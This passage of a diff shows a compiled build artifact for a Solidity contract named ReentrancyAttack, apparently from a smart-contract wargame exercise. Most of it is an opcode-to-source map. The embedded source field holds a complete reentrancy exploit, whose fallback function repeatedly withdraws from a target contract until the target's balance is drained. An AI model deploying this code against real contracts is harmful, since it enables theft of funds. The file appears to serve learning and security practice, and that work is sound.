+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "517": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "GAS",
+      "path": "16"
+    },
+    "518": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "CALL",
+      "path": "16"
+    },
+    "519": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "520": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "521": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "522": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x217"
+    },
+    "525": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "526": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "527": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "529": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "530": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "16"
+    },
+    "531": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "532": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "534": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "535": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "536": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "537": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "538": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "539": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "540": {
+      "fn": "ReentrancyAttack.attack",
+      "jump": "o",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "541": {
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "542": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x1"
+    },
+    "544": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "545": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "546": {
+      "fn": "ReentrancyAttack.attack",
+      "jump": "o",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMP",
+      "path": "16"
+    }
+  },
+  "sha1": "d65da362ec15ae74d64d11e3bbe6419fb291b7bb",
+  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.4;\n\nimport './Reentrancy.sol';\n\ncontract ReentrancyAttack {\n    Reentrance public reentrancyContract;\n    uint public amount = 0.001 ether;\n    \n    constructor(address payable _addr) public payable {\n        reentrancyContract = Reentrance(_addr);\n    }\n    // Fallback is called when reentrancyContract sends Ether to this contract.\n    fallback() external payable {\n        if (address(reentrancyContract).balance >= amount) {\n            reentrancyContract.withdraw(amount);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 0.001 ether);\n        reentrancyContract.donate{value: amount}(address(this));\n        reentrancyContract.withdraw(amount);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}",
+  "sourceMap": "85:765:16:-:0;;;180:11;159:32;;202:105;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;202:105:16;262:18;:38;;-1:-1:-1;;;;;262:38:16;;;-1:-1:-1;;;;;;262:38:16;;;;;;;;;85:765;;;;;;",
+  "sourcePath": "contracts/10_Reentrancy/ReentrancyAttack.sol",
+  "type": "contract"
+}
